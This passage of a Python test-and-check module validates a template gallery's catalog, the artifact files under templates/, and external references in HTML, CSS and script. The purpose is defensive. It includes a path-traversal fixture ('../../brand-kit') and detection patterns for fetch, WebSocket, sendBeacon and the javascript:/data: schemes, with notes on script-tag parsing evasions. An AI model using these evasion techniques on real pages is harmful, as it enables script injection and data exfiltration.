        self.entry_at(catalog, FIXTURE_ENTRY_ID)["trigger"] = [FIXTURE_SIGNALS[0]]
        self.write_manifest(catalog)

        self.assertReports(check_c3(self.gallery), f"entry '{FIXTURE_ENTRY_ID}'", "trigger")

    # -- C4: the empty signal set --

    def test_c4_accepts_a_populated_any_of(self) -> None:
        self.write_manifest(self.catalog())

        self.assertEqual(check_c4(self.gallery), [])

    def test_c4_rejects_an_empty_any_of(self) -> None:
        """A deleted last signal must fail loudly, not disable routing quietly."""
        catalog = self.catalog()
        self.entry_at(catalog, FIXTURE_ENTRY_ID)["trigger"] = {"any_of": []}
        self.write_manifest(catalog)

        self.assertReports(check_c4(self.gallery), f"entry '{FIXTURE_ENTRY_ID}'", "any_of")

    # -- C5 / C6: closure in both directions --

    def test_c5_accepts_triggers_naming_only_members(self) -> None:
        self.write_manifest(self.catalog())

        self.assertEqual(check_c5(self.gallery), [])

    def test_c5_rejects_a_trigger_naming_an_unknown_signal(self) -> None:
        """Story 2 scenario 2."""
        catalog = self.catalog()
        self.entry_at(catalog, FIXTURE_ENTRY_ID)["trigger"] = {"any_of": ["omega_signal"]}
        self.write_manifest(catalog)

        self.assertReports(check_c5(self.gallery), f"entry '{FIXTURE_ENTRY_ID}'", "omega_signal")

    def test_c6_accepts_a_vocabulary_every_member_of_which_is_consumed(self) -> None:
        self.write_manifest(self.catalog())

        self.assertEqual(check_c6(self.gallery), [])

    def test_c6_rejects_an_unused_member(self) -> None:
        catalog = self.catalog()
        self.entry_at(catalog, "code-approaches")["trigger"] = {"always": True}
        self.write_manifest(catalog)

        self.assertReports(check_c6(self.gallery), "signals", FIXTURE_SIGNALS[2])

    # -- C7: the uniform shape --

    def test_c7_accepts_a_trigger_on_every_entry(self) -> None:
        self.write_manifest(self.catalog())

        self.assertEqual(check_c7(self.gallery), [])

    def test_c7_rejects_an_ad_hoc_entry_carrying_no_trigger(self) -> None:
        """Ad-hoc triggers are never evaluated, and are still mandatory."""
        catalog = self.catalog()
        entry = self.entry_at(catalog, "slide-deck")
        self.assertEqual(entry["stage"], "ad-hoc")
        del entry["trigger"]
        self.write_manifest(catalog)

        self.assertReports(check_c7(self.gallery), "entry 'slide-deck'", "trigger")

    # -- C8: closure against the documented meanings --

    def test_c8_accepts_a_vocabulary_the_contract_documents(self) -> None:
        self.write_manifest(self.catalog())

        self.assertEqual(check_c8(self.gallery), [])

    def test_c8_rejects_an_undocumented_member(self) -> None:
        catalog = self.catalog()
        catalog["signals"][2] = "zeta_signal"
        self.write_manifest(catalog)

        self.assertReports(check_c8(self.gallery), "zeta_signal", SPA_CONTRACT_FILE)

    def test_c8_rejects_a_documented_name_the_vocabulary_does_not_carry(self) -> None:
        self.write_manifest(self.catalog())
        self.write_contract(FIXTURE_SIGNALS + ("zeta_signal",))

        self.assertReports(check_c8(self.gallery), "zeta_signal", SPA_CONTRACT_FILE)

    def test_c8_rejects_a_coordinated_rename(self) -> None:
        """The rename C1, C5, and C6 all pass through.

        The name changes in the vocabulary **and** in the trigger that consumes
        it, so the count is still five and closure still holds in both
        directions. Only the documented meanings, which are a second shipped
        artifact rather than a list held in this file, notice.
        """
        catalog = self.catalog()
        catalog["signals"][2] = "gamma_renamed"
        self.entry_at(catalog, "code-approaches")["trigger"] = {"any_of": ["gamma_renamed"]}
        self.write_manifest(catalog)

        self.assertEqual(check_c1(self.gallery), [])
        self.assertEqual(check_c5(self.gallery), [])
        self.assertEqual(check_c6(self.gallery), [])
        self.assertReports(check_c8(self.gallery), "gamma_renamed")

    def test_c8_rejects_an_absent_contract_document(self) -> None:
        self.write_manifest(self.catalog())
        (self.gallery / SPA_CONTRACT_FILE).unlink()

        self.assertReports(check_c8(self.gallery), SPA_CONTRACT_FILE, "missing")

    def test_c8_rejects_a_contract_document_with_no_signal_section(self) -> None:
        self.write_manifest(self.catalog())
        self.write_contract(heading="## Routing inputs")

        self.assertReports(check_c8(self.gallery), SPA_CONTRACT_FILE, SIGNAL_SECTION_HEADING)


# ---------------------------------------------------------------------------
# Group D — artifact existence and orphans (FR-009)
# ---------------------------------------------------------------------------


def _artifact_path(gallery_root: Path, identifier: str) -> Path | None:
    """The artifact an identifier derives, or ``None`` when resolution is refused.

    The path is composed from the identifier relative to the manifest's own
    directory and never read from a stored field — there is no stored path key
    to read. Resolution is **rejected rather than followed** when the composed
    path would leave ``templates/``, which is the only thing standing between an
    identifier carrying a separator or a parent-directory segment and a check
    that reads, or reports on, a file outside the artifact directory.
    """
    templates = gallery_root / TEMPLATES_DIR
    candidate = templates / f"{identifier}.html"
    return candidate if candidate.parent == templates else None


def _derived_artifacts(gallery_root: Path, status: str) -> tuple[list[tuple[str, str, Path]], list[str]]:
    """Every entry at one status, paired with the artifact its identifier derives.

    Returns the resolvable entries, plus the failures for entries whose
    identifier the derivation refuses to follow. Refusal is reported rather than
    skipped: an entry whose status cannot be checked against the artifact
    directory has not passed. Because an entry holds exactly one status, at most
    one of D1 and D2 reports any given entry.
    """
    entries = _entries(gallery_root)
    if entries is None:
        return [], []
    designations = _designations(entries)
    resolved: list[tuple[str, str, Path]] = []
    refused: list[str] = []
    for index, entry in enumerate(entries):
        if not isinstance(entry, dict) or entry.get("status") != status:
            continue
        where = designations[index]
        identifier = entry.get("id")
        if not isinstance(identifier, str) or not identifier:
            refused.append(
                _catalog_failure(
                    where,
                    f"field 'id': {identifier!r} derives no artifact path, so the entry's '{status}' status "
                    "cannot be checked against the artifact directory",
                )
            )
            continue
        artifact = _artifact_path(gallery_root, identifier)
        if artifact is None:
            refused.append(
                _catalog_failure(
                    where,
                    f"field 'id': '{identifier}' composes a path outside '{TEMPLATES_DIR}/', so resolution "
                    f"is refused and the entry's '{status}' status cannot be checked",
                )
            )
            continue
        resolved.append((where, identifier, artifact))
    return resolved, refused


def _artifact_label(identifier: str) -> str:
    return f"{TEMPLATES_DIR}/{identifier}.html"


def check_d1(gallery_root: Path) -> list[str]:
    """D1 — a ``shipped`` entry's artifact exists at the derived path."""
    resolved, refused = _derived_artifacts(gallery_root, SHIPPED)
    return refused + [
        f"{_artifact_label(identifier)}: {where}: field 'status': '{SHIPPED}', but no artifact exists at "
        "the derived path"
        for where, identifier, artifact in resolved
        if not artifact.is_file()
    ]


def check_d2(gallery_root: Path) -> list[str]:
    """D2 — a ``planned`` entry's artifact does **not** exist.

    The direction that makes the status a biconditional rather than a waiver.
    A5 keys the brand-block byte-compare on ``shipped``, so a real artifact left
    under a ``planned`` entry would ship without its embedded block ever being
    compared — making ``status`` an opt-out from the drift check. It is also
    what makes SC-004's "changes exactly one catalog value" enforceable rather
    than aspirational: adding an artifact without flipping its status would
    otherwise pass.
    """
    resolved, refused = _derived_artifacts(gallery_root, PLANNED)
    return refused + [
        f"{_artifact_label(identifier)}: {where}: field 'status': '{PLANNED}', but an artifact exists at "
        f"the derived path — an artifact ships only under a '{SHIPPED}' entry, whose embedded brand block "
        "is compared"
        for where, identifier, artifact in resolved
        if artifact.is_file()
    ]


def _artifact_files(gallery_root: Path, pattern: str) -> list[Path]:
    """Files under ``templates/``, swept recursively; an absent directory is none.

    The sweep is recursive because no identifier can name a nested file — B9
    admits no path separator — so a file in a subdirectory would otherwise be a
    place for one to accumulate unseen.
    """
    templates = gallery_root / TEMPLATES_DIR
    if not templates.is_dir():
        return []  # D5: an absent directory counts as zero artifacts
    return sorted(path for path in templates.rglob(pattern) if path.is_file())


def check_d3(gallery_root: Path) -> list[str]:
    """D3 — every ``.html`` file under ``templates/`` is claimed by exactly one entry."""
    entries = _entries(gallery_root)
    if entries is None:
        return []  # B1 and B3 own a catalog that names nothing
    designations = _designations(entries)
    claims: dict[Path, list[str]] = {}
    for index, entry in enumerate(entries):
        if not isinstance(entry, dict):
            continue
        identifier = entry.get("id")
        if not isinstance(identifier, str) or not identifier:
            continue
        artifact = _artifact_path(gallery_root, identifier)
        if artifact is None:
            continue  # D1 and D2 own the refused resolution
        claims.setdefault(artifact, []).append(designations[index])
    failures: list[str] = []
    for path in _artifact_files(gallery_root, "*.html"):
        claimants = claims.get(path, [])
        label = _label(gallery_root, path)
        if not claimants:
            failures.append(
                f"{label}: claimed by no catalog entry — the artifact path is derived as "
                f"'{TEMPLATES_DIR}/<id>.html', so an unclaimed file accumulates unnoticed"
            )
        elif len(claimants) > 1:
            failures.append(
                f"{label}: claimed by {len(claimants)} entries ({', '.join(claimants)}) rather than by "
                "exactly one"
            )
    return failures


def check_d4(gallery_root: Path) -> list[str]:
    """D4 — ``templates/`` holds no file that is not an ``.html`` artifact.

    Reported as **disallowed** rather than as an orphan: the derived path is
    always ``<id>.html``, so such a file is unclaimable by construction and
    would otherwise be a permanent, unfixable D3 failure instead of an
    actionable message. This is also why D5 must land alongside it — with an
    absent directory passing, nothing pushes an author toward the placeholder
    file this check forbids.
    """
    return [
        f"{_label(gallery_root, path)}: disallowed — the artifact path is derived as "
        f"'{TEMPLATES_DIR}/<id>.html', so no entry can ever name a file that is not '.html'"
        for path in _artifact_files(gallery_root, "*")
        if path.suffix != ".html"
    ]


def check_d5(gallery_root: Path) -> list[str]:
    """D5 — an **absent** ``templates/`` directory counts as zero artifacts.

    This is the state ART-001 actually ships: no artifact is ported, and version
    control preserves no empty directory, so the directory is absent at merge
    and D1-D4 must pass vacuously rather than error on a missing path. The
    assertion left to make is that the sweep is empty because the directory is
    **absent** — a file sitting at that path would leave every sweep above
    silently empty while looking, in a listing, exactly like an artifact
    directory.
    """
    templates = gallery_root / TEMPLATES_DIR
    if templates.exists() and not templates.is_dir():
        return [
            f"{TEMPLATES_DIR}: exists but is not a directory, so the artifact sweep D1-D4 depend on is "
            "silently empty"
        ]
    return []


GROUP_D_CHECKS: tuple[tuple[str, Callable[[Path], list[str]]], ...] = (
    ("D1", check_d1),
    ("D2", check_d2),
    ("D3", check_d3),
    ("D4", check_d4),
    ("D5", check_d5),
)


class ArtifactExistenceTests(unittest.TestCase):
    """Group D against the shipped gallery, which ships no ``templates/``."""

    def test_group_d_passes_against_the_shipped_gallery(self) -> None:
        for name, check in GROUP_D_CHECKS:
            with self.subTest(msg=name):
                self.assertEqual(check(GALLERY_ROOT), [])


# ---------------------------------------------------------------------------
# Group D fixtures — artifact existence and orphans (FR-009)
# ---------------------------------------------------------------------------


class ArtifactExistenceFixtureTests(CatalogFixtureCase):
    """Group D against synthetic galleries built in a temporary directory.

    The real gallery exercises only D5, because ART-001 ports no artifact and
    ships no ``templates/`` directory. Everything D1-D4 assert is exercised
    here, where the artifacts they describe actually exist.
    """

    def write_artifact_file(self, name: str) -> Path:
        return self.write(f"{TEMPLATES_DIR}/{name}", "<!doctype html>\n<html></html>\n")

    def ship(self, catalog: dict, identifier: str) -> dict:
        entry = self.entry_at(catalog, identifier)
        entry["status"] = SHIPPED
        return entry

    # -- D1: a shipped entry has its artifact --

    def test_d1_accepts_a_shipped_entry_whose_artifact_exists(self) -> None:
        catalog = self.catalog()
        self.ship(catalog, FIXTURE_ENTRY_ID)
        self.write_manifest(catalog)
        self.write_artifact_file(f"{FIXTURE_ENTRY_ID}.html")

        self.assertEqual(check_d1(self.gallery), [])

    def test_d1_rejects_a_shipped_entry_with_no_artifact(self) -> None:
        catalog = self.catalog()
        self.ship(catalog, FIXTURE_ENTRY_ID)
        self.write_manifest(catalog)

        self.assertReports(check_d1(self.gallery), f"{FIXTURE_ENTRY_ID}.html", "status")

    def test_d1_rejects_a_misnamed_artifact(self) -> None:
        """The path is derived from the identifier, never read from a field."""
        catalog = self.catalog()
        self.ship(catalog, FIXTURE_ENTRY_ID)
        self.write_manifest(catalog)
        self.write_artifact_file("flow-chart.html")

        self.assertReports(check_d1(self.gallery), f"{FIXTURE_ENTRY_ID}.html", "status")

    def test_d1_refuses_to_resolve_an_identifier_that_leaves_the_artifact_directory(self) -> None:
        catalog = self.catalog()
        entry = self.ship(catalog, FIXTURE_ENTRY_ID)
        entry["id"] = "../../brand-kit"
        self.write_manifest(catalog)

        self.assertReports(check_d1(self.gallery), self.position_of(FIXTURE_ENTRY_ID), "../../brand-kit")

    # -- D2: the other direction of the biconditional --

    def test_d2_accepts_a_planned_entry_with_no_artifact(self) -> None:
        self.write_manifest(self.catalog())

        self.assertEqual(check_d2(self.gallery), [])

    def test_d2_rejects_an_artifact_shipped_under_a_planned_entry(self) -> None:
        """The direction that keeps ``status`` from becoming an opt-out.

        A5 keys the brand-block byte-compare on ``shipped``, so a real artifact
        under a ``planned`` entry would ship without its embedded block ever
        being compared. It is also what makes SC-004's "changes exactly one
        catalog value" enforceable: adding the file without flipping the status
        would otherwise pass.
        """
        self.write_manifest(self.catalog())
        self.write_artifact_file(f"{FIXTURE_ENTRY_ID}.html")

        self.assertReports(check_d2(self.gallery), f"{FIXTURE_ENTRY_ID}.html", "status")

    def test_d2_leaves_shipped_entries_to_d1(self) -> None:
        catalog = self.catalog()
        self.ship(catalog, FIXTURE_ENTRY_ID)
        self.write_manifest(catalog)
        self.write_artifact_file(f"{FIXTURE_ENTRY_ID}.html")

        self.assertEqual(check_d2(self.gallery), [])

    def test_d2_refuses_to_resolve_an_identifier_that_leaves_the_artifact_directory(self) -> None:
        catalog = self.catalog()
        self.entry_at(catalog, FIXTURE_ENTRY_ID)["id"] = "../../brand-kit"
        self.write_manifest(catalog)

        self.assertReports(check_d2(self.gallery), self.position_of(FIXTURE_ENTRY_ID), "../../brand-kit")

    # -- D3: orphaned artifacts --

    def test_d3_accepts_an_artifact_claimed_by_exactly_one_entry(self) -> None:
        catalog = self.catalog()
        self.ship(catalog, FIXTURE_ENTRY_ID)
        self.write_manifest(catalog)
        self.write_artifact_file(f"{FIXTURE_ENTRY_ID}.html")

        self.assertEqual(check_d3(self.gallery), [])

    def test_d3_rejects_an_orphaned_artifact(self) -> None:
        self.write_manifest(self.catalog())
        self.write_artifact_file("retired-template.html")

        self.assertReports(check_d3(self.gallery), "retired-template.html", "no catalog entry")

    def test_d3_rejects_an_artifact_two_entries_claim(self) -> None:
        catalog = self.catalog()
        self.ship(catalog, FIXTURE_ENTRY_ID)
        self.ship(catalog, "slide-deck")["id"] = FIXTURE_ENTRY_ID
        self.write_manifest(catalog)
        self.write_artifact_file(f"{FIXTURE_ENTRY_ID}.html")

        self.assertReports(check_d3(self.gallery), f"{FIXTURE_ENTRY_ID}.html", "2")

    def test_d3_rejects_an_artifact_hidden_in_a_subdirectory(self) -> None:
        """No identifier can name it, since B9 admits no path separator."""
        self.write_manifest(self.catalog())
        self.write_artifact_file(f"archive/{FIXTURE_ENTRY_ID}.html")

        self.assertReports(check_d3(self.gallery), f"archive/{FIXTURE_ENTRY_ID}.html", "no catalog entry")

    # -- D4: files no identifier can ever name --

    def test_d4_accepts_a_directory_of_artifacts(self) -> None:
        catalog = self.catalog()
        self.ship(catalog, FIXTURE_ENTRY_ID)
        self.write_manifest(catalog)
        self.write_artifact_file(f"{FIXTURE_ENTRY_ID}.html")

        self.assertEqual(check_d4(self.gallery), [])

    def test_d4_rejects_a_placeholder_file(self) -> None:
        """The file an author reaches for to track the directory in version control."""
        self.write_manifest(self.catalog())
        self.write(f"{TEMPLATES_DIR}/.gitkeep", "")

        self.assertReports(check_d4(self.gallery), ".gitkeep", "disallowed")

    def test_d4_rejects_a_non_html_file_rather_than_calling_it_an_orphan(self) -> None:
        self.write_manifest(self.catalog())
        self.write(f"{TEMPLATES_DIR}/README.md", "# Templates\n")

        self.assertReports(check_d4(self.gallery), "README.md", "disallowed")

    # -- D5: the state this feature actually ships --

    def test_d5_accepts_an_absent_templates_directory(self) -> None:
        """ART-001 ports no artifact, and version control preserves no empty directory."""
        self.write_manifest(self.catalog())

        self.assertFalse((self.gallery / TEMPLATES_DIR).exists())
        for name, check in GROUP_D_CHECKS:
            with self.subTest(msg=name):
                self.assertEqual(check(self.gallery), [])

    def test_d5_rejects_a_templates_path_that_is_not_a_directory(self) -> None:
        self.write_manifest(self.catalog())
        self.write(TEMPLATES_DIR, "")

        self.assertReports(check_d5(self.gallery), TEMPLATES_DIR, "not a directory")


# ---------------------------------------------------------------------------
# Group E — external references (FR-011; SC-008)
# ---------------------------------------------------------------------------
#
# The scan is **default-deny with a closed exemption list**, not an enumeration
# of positions. An enumeration is a denylist: anything unenumerated is permitted
# by construction, which is how the earlier formulation came to omit ``source``,
# ``video``, ``audio``, ``track``, ``object``, ``embed``, image-typed inputs,
# SVG ``image``/``use``, ``form action``, ``a ping``, ``meta`` refresh, and
# ``base``. The exemptions are ``href`` on an anchor, addresses inside
# parser-recognized comments, and visible text — narrow on purpose, because they
# are the attack surface.
#
# Three of the contract's twelve rows are properties of the collector rather
# than checks that can fail on their own, so they have no ``check_*`` of their
# own and are asserted by named tests instead. E3 is the comment-and-text
# exemption, which is demonstrated by a document whose URLs are in those
# positions passing and by comment-shaped raw text *inside a script element*
# failing. E9 is that both ``@import`` forms are recognized — the URL-token form
# by ``_STYLE_URL_RE`` and the bare-string form by ``_IMPORT_STRING_RE``. E11 is
# that ``srcset`` is split by the documented algorithm and every candidate
# scanned. Each is proved by a fixture reaching the group's failures, which is
# the only way a collector property can be proved at all.

RELEASE_NOTE_POLICY_TEST = REPO_ROOT / "tests" / "speckit-pro" / "unit" / "test-release-note-policy.py"
UNSAFE_CORPUS_NAME = "unsafe_destinations"


def _unsafe_destination_corpus() -> list[str]:
    """The unsafe-destination corpus this repository already maintains.

    Read out of ``test-release-note-policy.py`` rather than copied, so E7's
    negative corpus cannot drift from the one the release-note policy is tested
    against. The corpus is a literal inside a test method, so it is lifted with
    ``ast`` rather than imported; an empty result means it moved, which the
    caller reports rather than passing over.
    """
    tree = ast.parse(RELEASE_NOTE_POLICY_TEST.read_text(encoding="utf-8"))
    for node in ast.walk(tree):
        if not isinstance(node, ast.Assign):
            continue
        if not any(isinstance(target, ast.Name) and target.id == UNSAFE_CORPUS_NAME for target in node.targets):
            continue
        return [item for item in ast.literal_eval(node.value) if isinstance(item, str)]
    return []


FONT_STYLESHEET_HOST = "fonts.googleapis.com"
ALLOWED_HOSTS: frozenset[str] = frozenset({FONT_STYLESHEET_HOST, "fonts.gstatic.com"})
FONT_DISPLAY_PARAMETER = "display"
FONT_DISPLAY_VALUE = "swap"
STYLESHEET_RELATION = "stylesheet"
RESOURCE_SCHEME = "https"

# The relations that fetch, plus the two that contact the host without
# fetching. This set does **not** gate whether a ``link href`` is scanned —
# every one is, by default — it is what E4 keys on and what a failure names.
# Recording it separately is what keeps the earlier two-relation enumeration
# from reappearing as a denylist.
FETCHING_RELATIONS: frozenset[str] = frozenset(
    {
        "stylesheet",
        "preload",
        "modulepreload",
        "prefetch",
        "prerender",
        "icon",
        "apple-touch-icon",
        "manifest",
        "preconnect",
        "dns-prefetch",
    }
)

# E2's closed scheme set for the one exempt position. "Navigation to any host"
# taken literally would exempt ``javascript:`` and ``data:``, which are not
# navigation to a host at all.
NAVIGATION_SCHEMES: frozenset[str] = frozenset({"https", "mailto"})

# URL-valued attributes the scanner recognizes. This is not the boundary of the
# scan — an attribute *outside* it carrying a URL-shaped value is reported by
# E0 rather than admitted — it is the set whose values are parsed and
# host-checked instead of merely refused.
URL_ATTRIBUTES: frozenset[str] = frozenset(
    {
        "action",
        "archive",
        "background",
        "cite",
        "classid",
        "codebase",
        "data",
        "formaction",
        "href",
        "icon",
        "longdesc",
        "manifest",
        "ping",
        "poster",
        "profile",
        "src",
        "usemap",
        "xlink:href",
    }
)
SRCSET_ATTRIBUTES: frozenset[str] = frozenset({"srcset", "imagesrcset"})

# Attributes whose URL content is collected by the text pass instead: ``style``
# carries ``url()``, and an event handler carries a network call. Listing them
# keeps E0 from reporting the same reference twice under two rules.
TEXT_SCANNED_ATTRIBUTES: frozenset[str] = frozenset({"style"})
EVENT_HANDLER_PREFIX = "on"

# Attributes whose value is a namespace *name*, not a resource. A namespace URI
# is an identifier compared as a string; nothing fetches it, and the SVG one is
# required markup on inline SVG — the standard iconography for a self-contained
# artifact. Without this exemption E0's default-deny branch reports
# ``http://www.w3.org/2000/svg`` as an unverified host and the gate turns red on
# correct markup, which is the pressure that gets a gate weakened rather than
# obeyed. Prefix-matched so ``xmlns:xlink`` and any other prefixed declaration
# are covered; ``xlink:href`` is NOT a namespace declaration and stays scanned.
NAMESPACE_ATTRIBUTE_PREFIX = "xmlns"

# A ``data:`` reference carries its bytes inline, so it makes no request and
# names no host. It is the ONLY way the single-file rule can be satisfied with a
# raster, an encoded vector, or an inline font, so refusing it outright would put
# the contract in conflict with itself — E7 and E8 both fired on it, giving a
# conforming author two failures and no documented escape.
#
# Bounded by media type rather than admitted wholesale: a ``data:`` URI can also
# carry a document, and ``data:text/html`` is a script execution context. Only
# image and font types are embedded assets. SVG is included because in an image
# or CSS position it renders in a mode that runs no script, and the policy
# declaration's ``object-src 'none'`` and ``frame-src 'none'`` close the
# positions where it would.
EMBEDDED_ASSET_TYPE_PREFIXES: tuple[str, ...] = ("image/", "font/")


def _embedded_asset(value: str) -> bool:
    """True when the value is a ``data:`` URI carrying an image or a font."""
    stripped = value.strip()
    if not stripped.casefold().startswith("data:"):
        return False
    media = stripped[len("data:") :].split(",", 1)[0].split(";", 1)[0].strip().casefold()
    return media.startswith(EMBEDDED_ASSET_TYPE_PREFIXES)

# E6's grammar: RFC 3986's unreserved and reserved sets plus the percent that
# introduces an escape. Stated as a repertoire rather than as a list of bad
# characters, which is what makes it closed. It subsumes the pre-parse rejection
# ``_validated_http_url`` performs in ``scripts/release_note_policy.py``
# (whitespace, control characters, and the ``\<>`|`` delimiters) — the backslash
# being the load-bearing member, since a browser treats it as terminating the
# authority and Python does not — and it additionally refuses every non-ASCII
# character, which a URL must percent-encode.
_URL_GRAMMAR_RE = re.compile(r"[^A-Za-z0-9\-._~:/?#\[\]@!$&'()*+,;=%]")

NAVIGATION = "navigation"
RESOURCE = "resource"

VOID_ELEMENTS: frozenset[str] = frozenset(
    {
        "area",
        "base",
        "br",
        "col",
        "embed",
        "hr",
        "img",
        "input",
        "link",
        "meta",
        "param",
        "source",
        "track",
        "wbr",
    }
)


class _Element(NamedTuple):
    """One start tag, in document order, with the element that encloses it."""

    order: int
    tag: str
    parent: str | None
    attributes: tuple[tuple[str, str], ...]


class _Reference(NamedTuple):
    """One scanned position and the reference written in it."""

    label: str
    position: str
    value: str
    kind: str
    style: bool
    relations: tuple[str, ...]


class _ElementCollector(HTMLParser):
    """Element positions in document order, each with its parent element.

    Void elements are never pushed onto the stack — they take no end tag, so
    pushing one would reparent everything after it and J7's "direct child of
    the head element" would read the wrong answer for exactly the element it
    is asked about.
    """

    def __init__(self) -> None:
        super().__init__(convert_charrefs=True)
        self.elements: list[_Element] = []
        self._stack: list[str] = []

    def handle_starttag(self, tag: str, attrs: list[tuple[str, str | None]]) -> None:
        self._record(tag, attrs)
        if tag not in VOID_ELEMENTS:
            self._stack.append(tag)

    def handle_startendtag(self, tag: str, attrs: list[tuple[str, str | None]]) -> None:
        self._record(tag, attrs)

    def handle_endtag(self, tag: str) -> None:
        if tag in self._stack:
            while self._stack and self._stack.pop() != tag:
                continue

    def _record(self, tag: str, attrs: list[tuple[str, str | None]]) -> None:
        self.elements.append(
            _Element(
                order=len(self.elements),
                tag=tag,
                parent=self._stack[-1] if self._stack else None,
                attributes=tuple((name.lower(), value if value is not None else "") for name, value in attrs),
            )
        )


def _elements(text: str) -> list[_Element]:
    collector = _ElementCollector()
    collector.feed(text)
    collector.close()
    return collector.elements


def _document_text(path: Path) -> str:
    """A gallery file's text, with an undecodable byte replaced rather than raised.

    A file that is not text carries no reference a document can load, and a
    decode error there would stop the sweep before it reached the files that do.
    """
    with path.open("r", encoding="utf-8", errors="replace", newline="") as handle:
        return handle.read()


def _gallery_files(gallery_root: Path) -> list[Path]:
    """Every file under the gallery, not only ``templates/``.

    FR-011 says "every gallery artifact", and this feature ships none. Read that
    way the whole group would be vacuous at merge. The canonical ``brand-kit.css``
    and ``theme-toggle.html`` are embedded verbatim into all 21 artifacts, so a
    foreign reference in either reaches every artifact and is fixable in none of
    them — which is why they are swept here rather than excluded as "not an
    artifact".
    """
    if not gallery_root.is_dir():
        return []
    return sorted(path for path in gallery_root.rglob("*") if path.is_file())


# A value is URL-shaped when it carries a hierarchical scheme, is
# scheme-relative, or opens with one of the opaque schemes that still act. A
# relative path in an unrecognized attribute names no host and is left alone.
_URL_SHAPED_RE = re.compile(
    r"(?i)[a-z][a-z0-9+.\-]*://"
    r"|(?:\A|[\s,;'\"(])//[^/\s]"
    r"|\A\s*(?:javascript|data|vbscript|blob|file|mailto):"
)

# The ``url()`` token, case-insensitive and tolerant of whitespace, newlines,
# and optional quotes. Executed against every ordinary surface form; a pattern
# written without these tolerances silently misses ordinary CSS.
_STYLE_URL_RE = re.compile(r"(?i)\burl\s*\(\s*(?P<quote>['\"]?)(?P<ref>.*?)(?P=quote)\s*\)", re.DOTALL)

# The bare-string ``@import`` form. The URL-token form is collected by
# ``_STYLE_URL_RE`` above, which is what makes E9's two forms both reachable —
# a pattern written only for ``@import url(...)`` matches neither.
_IMPORT_STRING_RE = re.compile(r"(?i)@import\s+(?P<quote>['\"])(?P<ref>.*?)(?P=quote)", re.DOTALL)

# Network destinations, matched anywhere in the document text including inside
# attribute values — which is what catches a destination hidden in an event
# handler whose element's own ``src`` is innocuous.
_CALL_SITE_RE = re.compile(
    r"(?i)"
    r"(?<![\w$.])(?:fetch|importScripts|import|new\s+(?:WebSocket|SharedWorker|Worker|EventSource))\s*\("
    r"|\.\s*(?:open|sendBeacon)\s*\("
)
_STRING_LITERAL_RE = re.compile(r"'([^'\n]*)'|\"([^\"\n]*)\"|`([^`\n]*)`")
CALL_ARGUMENT_WINDOW = 400

# A ``script`` element is a raw-text element: its content ends at the first
# ``</script``, and no nesting is possible, so the body is delimited rather than
# parsed. Matching it is what lets the whole body be scanned instead of only the
# window after a recognized call.
#
# The end tag is ``</script`` followed by whitespace, ``/``, or ``>`` — an end tag
# may carry bogus attributes and still terminate the element, so ``</script foo>``
# and ``</script\t\nbar>`` both end it. A pattern requiring ``</script\s*>``
# misses those, and missing the end tag means the body is not scanned at all:
# a one-token evasion against the whole script pass. ``\b`` is what keeps
# ``</scriptfoo>`` from matching, since that is not an end tag.
# The start tag allows ``>`` inside a quoted attribute value, which is valid HTML
# — ``<script type="text/plain;x=a>b">`` is one tag, not a tag plus body. Stopping
# at the first ``>`` put the tail of the start tag into the body, which misparsed
# markup literals and mangled the start tag when blanking. Detection stayed
# conservative either way, because the body was a superset; correctness of the
# delimiter is the point, and the end-tag mistake above is what argues for it.
_SCRIPT_BODY_RE = re.compile(
    r"(?is)(<script\b(?:[^>\"']|\"[^\"]*\"|'[^']*')*>)(.*?)(</script\b[^>]*>)"
)

# XML namespace identifiers. These are compared as strings by a parser and are
# never fetched, so a namespace constant assigned in script is not a reference.
# The canonical head block itself assigns the SVG namespace when it builds the
# brand mark, which is exactly the shape the literal scan below would otherwise
# report — a false positive on the kit's own shipped code.
NAMESPACE_URIS: frozenset[str] = frozenset(
    {
        "http://www.w3.org/2000/svg",
        "http://www.w3.org/1999/xlink",
        "http://www.w3.org/1999/xhtml",
    }
)


def _script_bodies(text: str) -> list[str]:
    return [match.group(2) for match in _SCRIPT_BODY_RE.finditer(text)]


def _script_markup_literals(text: str) -> list[str]:
    """Every markup-shaped string literal inside a script element.

    Markup assigned to a string — the ``innerHTML`` case — is never seen by an
    HTML parser reading the document, so both the reference scan and the construct
    checks are blind to it unless it is parsed separately. Shape is judged by the
    presence of both angle brackets, which is deliberately loose: over-parsing a
    literal that is not markup finds no elements and costs nothing, while
    under-parsing one that is leaves a construct unreachable.
    """
    literals: list[str] = []
    for body in _script_bodies(text):
        for literal in _STRING_LITERAL_RE.finditer(body):
            value = next((group for group in literal.groups() if group is not None), "").strip()
            if "<" in value and ">" in value:
                literals.append(value)
    return literals


def _without_script_bodies(text: str) -> str:
    """``text`` with every script body blanked, offsets preserved.

    The call-site pass and this module's script pass would otherwise both read a
    literal inside a script and report one defect twice. Blanking gives each pass
    exactly one jurisdiction: script bodies here, everything else — ``<style>``
    content, style attributes, event-handler attributes — there. Event handlers
    are attribute values, not script bodies, so they stay with the call-site pass.
    """
    return _SCRIPT_BODY_RE.sub(lambda m: m.group(1) + (" " * len(m.group(2))) + m.group(3), text)


def _script_references(label: str, text: str) -> list[_Reference]:
    """Every URL-shaped string literal inside a script element.

    The call-site pass read only string literals appearing between the parens of
    eight fixed call forms, which left the ordinary ways a script names a
    destination invisible:

    * a static module import — ``import {x} from "https://host/m.js"`` — plus the
      bare, ``export … from``, and import-map forms. None matches a call form,
      because none is a call; and the shipped policy declaration carries no
      ``script-src`` or ``default-src``, so nothing backed it up either. That is
      remote code execution, not a subresource.
    * a URL bound to a variable and used later — ``var E = "https://host/x";
      fetch(E)`` — where the call form matches but its argument is an identifier.
    * an assignment rather than a call — ``img.src = "https://host/b"``.
    * markup written into a string and injected — ``el.innerHTML = '<img
      src="https://host/m.png">'`` — which reaches no HTML parser, so no element
      pass ever sees it.

    Scanning every literal covers all four with one rule instead of enumerating
    call forms, which is the same default-deny argument E0 makes for attributes.
    A literal that is URL-shaped is a reference; the host allowlist then decides.

    A literal is not always itself a URL. ``innerHTML`` is assigned *markup*, and
    the kit's own head block assigns a four-kilobyte SVG that way. Treating such a
    literal as one URL both misreports it and trips E6's repertoire rule on the
    surrounding markup. So a markup-shaped literal is parsed as markup and run
    through the element pass — which is also what makes the ``xmlns`` exemption
    apply to it, exactly as it does in the document.
    """
    references: list[_Reference] = []
    for number, body in enumerate(_script_bodies(text), start=1):
        where = f"<script> literal (block {number})"
        for literal in _STRING_LITERAL_RE.finditer(body):
            value = next((group for group in literal.groups() if group is not None), "").strip()
            if not value or value in NAMESPACE_URIS:
                continue
